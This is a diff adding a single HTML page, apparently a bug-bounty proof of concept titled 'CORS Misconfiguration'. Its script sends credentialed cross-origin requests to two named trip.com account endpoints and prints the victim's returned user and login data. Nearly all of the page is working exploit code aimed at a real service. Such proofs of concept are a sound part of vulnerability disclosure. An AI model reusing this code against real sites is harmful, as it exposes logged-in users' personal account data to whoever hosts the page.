@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+        <title>CORS Misconfiguration</title>
+        <link
+            href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css"
+            rel="stylesheet"
+        />
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body {
+                width: 100vw;
+                height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 3vmin;
+                background: #000;
+                color: #ce0000;
+                font-size: 3vmin;
+                padding: 2vmin;
+            }
+            #output {
+                width: 100%;
+                height: 100%;
+                background: #111;
+                overflow: auto;
+                padding: 1vmin;
+            }
+            button {
+                width: 70%;
+                border: none;
+                border-radius: 2vmin;
+                color: #fff;
+                background: #ce0000;
+                padding: 1.5vmin;
+                transition: 0.3s;
+            }
+            button:hover {
+                opacity: 0.5;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>CORS Misconfiguration</h1>
+        <span class="status">---</span>
+        <pre
+            id="output"
+            class="language-javascript"
+        ><code class="language-javascript"></code
+        ></pre>
+        <button onclick="poc()">Proof of Concept</button>
+        <script>
+            function poc() {
+                const endpoint1 =
+                    "https://www.trip.com/restapi/soa2/27024/getUserInfo";
+                const endpoint2 =
+                    "https://www.trip.com/restapi/soa2/27024/ssoIsLoginAndGetAccountInfo";
+
+                let status = document.querySelector(".status");
+                const output = document.querySelector("#output code");
+
+                status.textContent = "Sending Request...";
+
+                Promise.all([
+                    fetch(endpoint1, {
+                        method: "GET",
+                        credentials: "include"
+                    }).then(res => res.json()),
+                    fetch(endpoint2, {
+                        method: "GET",
+                        credentials: "include"
+                    }).then(res => res.json())
+                ])
+                    .then(([data1, data2]) => {
+                        output.textContent =
+                            `// Endpoint 1: getUserInfo\n` +
+                            `${JSON.stringify(data1, null, 2)}\n\n` +
+                            `// Endpoint 2: ssoIsLoginAndGetAccountInfo\n` +
+                            `${JSON.stringify(data2, null, 2)}`;
+                        Prism.highlightElement(output);
+                        status.textContent = "Success";
+                    })
+                    .catch(error => {
+                        output.textContent = `Error:\n${error}`;
+                        Prism.highlightElement(output);
+                        status.textContent = "Error";
+                    });
+            }
+        </script>
+    </body>
+</html>
